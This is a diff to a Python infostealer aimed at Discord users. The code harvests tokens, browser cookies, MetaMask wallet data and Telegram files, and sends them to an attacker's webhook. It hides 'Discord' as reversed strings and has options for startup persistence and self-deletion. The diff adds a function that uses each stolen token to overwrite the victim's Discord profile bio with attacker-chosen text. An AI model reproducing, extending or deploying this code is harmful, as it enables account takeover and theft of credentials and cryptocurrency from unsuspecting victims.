@@ -26,6 +26,8 @@ OneTimeSteal = '%Onetime%'
 melter = '%Melter%'
 crasher = '%Crash%'
 hidewindow = '%Hide%'
+changebio = '%ChangeBio%'
+biotext = '''%Text%'''
 
 if Startup == False:
     StartupMessage = 'Adding to startup disabled in the config'
@@ -563,6 +565,22 @@ documents_path = os.path.join(home_dir, 'Documents')
 pictures_path = os.path.join(home_dir, 'Pictures')
 
 
+def change_about_me(token):
+    try:
+        headers = {
+            "Authorization": f"{token}",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+            "Content-Type": "application/json"
+        }
+        
+        data = {
+            "bio": biotext
+        }
+        url = "https://discord.com/api/v9/users/@me/profile"
+        response = requests.patch(url, headers=headers, json=data)
+    except:
+        pass
+
 badgeList =  [
         {"Name": 'Active_Developer','Value': 4194304,'Emoji': '<:active:1045283132796063794> '},
         {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
@@ -953,6 +971,8 @@ def uploadTokq(Tokq, path):
         data = data[:character_limit - 3] + "..."
 
     LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
+    if changebio == True:
+        change_about_me(Tokq)
 
 
 
@@ -2011,6 +2031,8 @@ def getCook(path, arg):
         writeforfile(Cookies, 'cook')
     except:
         pass
+    
+
             
 def GatherZips(paths1, paths2, paths3):
     thttht = []
@@ -2089,7 +2111,9 @@ def gatha():
         [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
+        
     ]
+
     d = 'drocsiD'
     ddd = 'btpdrocsid'
     dd = 'drocthgiL'
@@ -2151,7 +2175,9 @@ def gatha():
         tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
         tokq.start()
         aa.append(tokq)
-
+        
+        
+    
     getinf = threading.Thread(target=getinfo)
     getinf.start()
     aa.append(getinf)
@@ -2189,6 +2215,7 @@ def gatha():
     else:
         pass
 
+        
     gatz = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram])
     gatz.start()
     aa.append(gatz)
@@ -2197,6 +2224,7 @@ def gatha():
     upfd.start()
     aa.append(upfd)
     
+
     hist = threading.Thread(target=histup)
     hist.start()
     aa.append(hist)
@@ -2248,7 +2276,7 @@ def gatha():
         datas = threading.Thread(target=paaz, args=[item])
         datas.start()
         aa.append(datas)
-
+    
     for thread in aa:
         thread.join()
         
